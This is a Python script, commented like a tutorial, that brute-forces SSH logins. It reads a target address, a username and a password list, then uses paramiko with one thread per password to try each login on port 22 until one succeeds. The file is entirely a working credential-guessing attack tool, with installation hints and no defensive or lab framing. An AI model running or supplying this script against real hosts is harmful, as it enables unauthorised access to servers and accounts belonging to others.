# The Paramiko Lib is going to be used to automate the process
# Of connecting to our SSH client, as it has all the necessary
# Pre-made functions needed to make the process shorter
# To install Paramiko use - pip3 install paramiko
# Read More on Paramiko (http://docs.paramiko.org/en/stable/)
import paramiko
import sys
import os
import socket
# Term color is used to print statements in diff colors
# To install Term color use - pip3 install termcolor
# Read More on Term color (https://pypi.org/project/termcolor/)
import termcolor
import threading
import time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    # global host
    # global username
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # connect function from paramiko takes in 4 parameters to initiate
        # connection (IP address/Host, Port, Username, and Password)
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        # using termcolor.colored(First bracket is for data to change color), second for color to use)
        print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
    # The paramiko.AuthenticationException is returned when the login credentials
    # Are invalid or not authenticated
    except:
        print(termcolor.colored(('[-] Incorrect Credential: ' + password), 'red'))
    # Paramiko close() function closes the connections
    ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print('\n')

if not os.path.exists(input_file):
    print('[!!] That file/path does not exist')
    sys.exit(1)

print(termcolor.colored(('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *'), 'blue'))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(1.5)
